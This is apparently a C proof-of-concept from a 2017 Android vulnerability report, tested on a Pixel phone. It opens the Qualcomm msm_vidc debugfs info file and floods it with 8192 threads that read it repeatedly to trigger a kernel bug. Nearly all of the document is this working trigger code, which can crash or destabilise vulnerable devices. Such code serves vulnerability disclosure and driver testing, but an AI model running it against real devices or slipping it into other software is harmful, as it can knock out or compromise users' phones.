/*
 * https://code.google.com/p/android/issues/detail?id=233693
 * The poc was tested in pixel, 
 * google/sailfish/sailfish:7.1.1/NOF26V/3636322:user/release-keys
 * chengjia4574@gmail.com, 20170208
*/
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <asm/ioctl.h>
#include <pthread.h>

#define DEBUG                                               
#ifdef DEBUG                                             
#define LOG(fmt, ...) do { \
	printf("%s:%d: "fmt "\n", __FUNCTION__, \
			__LINE__, ##__VA_ARGS__); \
} while (0) 
#else
#define LOG(fmt, ...) 
#endif


int fd = -1;
int open_file(char* filename)
{
	int fd;

	fd = open(filename, O_RDONLY);
	if(fd<0) {
		LOG("open %s fail %s\n",filename, strerror(errno));
		exit(1);
	}
	LOG("[%d] open %s succ return fd %d\n",gettid(),filename, fd);
	
	return fd;
}

#define SIZE 64 
void test_read(int fd)
{
	int ret;
	char buf[SIZE];
	ret = read(fd, buf, SIZE);
	if(ret<0) {
		LOG("read fail %s\n",strerror(errno));
	} else {
		//LOG("[%d] succ read %d byte from fd %d\n",gettid(), ret, fd);
	}	
	return 0;
}

void ReadThread(void) {
	while(1) { 
		test_read(fd); 
		sleep(0.1);
	}
}


#define TC 8192 
void trigger()
{
	int i, ret;
	pthread_t tids[TC];

	fd = open_file("/sys/kernel/debug//msm_vidc/core0/info");
	
	LOG("Try to trigger..\n");

	for(i=0; i<TC; i++)
		ret = pthread_create((pthread_t *) &tids[i], NULL, (void *) ReadThread, NULL);

	for(i=0; i<TC; i++)
		pthread_join(tids[i], NULL);
}

	int
main(int argc, char *argv[])
{
	trigger();
	return 0;
}
